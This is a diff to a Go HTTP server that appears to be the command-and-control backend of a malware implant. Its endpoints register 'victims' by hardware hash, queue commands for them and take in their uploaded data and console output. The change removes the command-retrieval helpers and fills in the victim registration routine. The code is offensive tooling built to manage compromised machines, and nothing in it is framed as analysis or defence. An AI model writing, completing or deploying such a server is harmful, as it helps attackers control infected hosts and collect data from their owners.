@@ -1,21 +1,11 @@
 package main
 
 import (
-	//"bufio"
-	//"bytes"
-	//"encoding/base64"
-	"strings"
 	"encoding/json"
 	"fmt"
 	"io"
 	"net/http"
-	"sync"
-
-	rbt "github.com/emirpasic/gods/trees/redblacktree"
 )
-
-var superCatTree = rbt.NewWithStringComparator() // key: hash, value: []IncomingSuperCatData
-var superCatMutex sync.Mutex
 
 // runs in a goroutine
 func startServer() {
@@ -49,34 +39,17 @@ func proxyHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-
 	switch designator {
 	case "victimregister/json":
 		resp := RegisterNewVictim(json)
-		fmt.Fprintf(w, resp)
+		fmt.Fprintf(w, "%s" ,resp)
 	case "requestCommand/json":
 		resp := HandleIncomingRequest(json)
-		fmt.Fprintf(w, resp)
+		fmt.Fprintf(w, "%s", resp)
 	case "incomingData/json":
 		resp := HandleIncomingData(json)
-		fmt.Fprintf(w, resp)
+		fmt.Fprintf(w, "%s", resp)
 	}
-
-	
-
-}
-
-// needs to be implemented
-// FREDY: I need this to return true if it finds that the incoming hash has messages that can be read from its individual queue
-func DoesHashHaveMessages(inputHash string) bool {
-	clientTreeMutex.Lock()
-	defer clientTreeMutex.Unlock()
-
-	if val, found := clientTree.Get(inputHash); found {
-		victim := val.(VictimInfo)
-		return len(victim.Commands) > 0
-	}
-	return false
 }
 
 func HandleIncomingCatData(incomingSuperCatString string) {
@@ -120,26 +93,43 @@ func HandleIncomingCatData(incomingSuperCatString string) {
 
 }
 
-func HashGetNextCommand(incomingHash string) VictimCommand {
-	//for any given incoming hash get if possible the next command to run return this so it can be sent to the client
-	//
+func RegisterNewVictim(incomingJson string) (toReturn string){
 	clientTreeMutex.Lock()
 	defer clientTreeMutex.Unlock()
+	
+	println(incomingJson)
 
-	if val, found := clientTree.Get(incomingHash); found {
-		victim := val.(VictimInfo)
-		if len(victim.Commands) > 0 {
-			nextCmd := victim.Commands[0]
-			victim.Commands = victim.Commands[1:]
-			clientTree.Put(incomingHash, victim)
-			return nextCmd
-		}
+	//see if the incoming data is even valid
+	var newVictimInfo VictimRegister
+	err := json.Unmarshal([]byte(incomingJson), &newVictimInfo)
+	if (err != nil || newVictimInfo.HardwareHash == ""){
+		println(err, ":",  newVictimInfo.HardwareHash)
+		var Response AssimilateResponse
+		Response.ResponseCode   = 1
+		Response.ResponseString = "Failure invalid"
+		jsonResponse, _ :=json.Marshal(Response)
+		return string(jsonResponse)
 	}
-	return VictimCommand{}
-}
 
+	//see if the tree already has this entry
+	_, exists := clientTree.Get(newVictimInfo.HardwareHash);
+	if  (exists) {
+		var Response AssimilateResponse
+		Response.ResponseCode   = 1
+		Response.ResponseString = "Failure invalid2"
+		jsonResponse, _ :=json.Marshal(Response)
+		return string(jsonResponse)
+	}
 
-func RegisterNewVictim(incomingJson string) (toReturn string){
+	//if it makes it here its valid return a success and put into the tree
+	victim := VictimInfo{
+		Commands:    		[]VictimCommand{},
+		VictimInfo:  		newVictimInfo,
+		VictimConsoleOutput: []string{},
+	}
+	clientTree.Put(newVictimInfo.HardwareHash, victim)
+
+	fmt.Println("Registered new client with hash:", newVictimInfo.HardwareHash)
 	return ""
 }
 
